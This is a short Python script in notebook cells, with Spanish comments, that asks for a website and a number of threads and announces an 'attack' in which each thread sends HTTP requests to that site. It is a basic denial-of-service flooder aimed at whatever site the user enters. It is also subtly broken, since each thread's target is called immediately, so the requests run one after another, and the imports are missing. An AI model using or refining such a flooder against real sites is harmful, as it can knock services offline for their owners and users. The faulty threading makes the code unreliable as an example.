```python
def id_ataque(nombreWeb): #funcion que me sirve para cualquier pagina web pasada por parametro
    print(requests.get(nombreWeb))
    print("Lanzado el hilo con identificador: ", threading.current_thread().getName()) 
```

```python
def ataque(web, numerohilos):
    for i in range (numerohilos):
        threading.Thread(target=id_ataque(web)).start()
```

```python
num_hilos = int(input("Dime el numero de hilos: "))
```

```python
web = str(input("Dime la pagina web"))
```

```python
print("Ataque a ", web, "usando ", num_hilos, "hilos.")
```

```python
ataque(web, num_hilos)
```
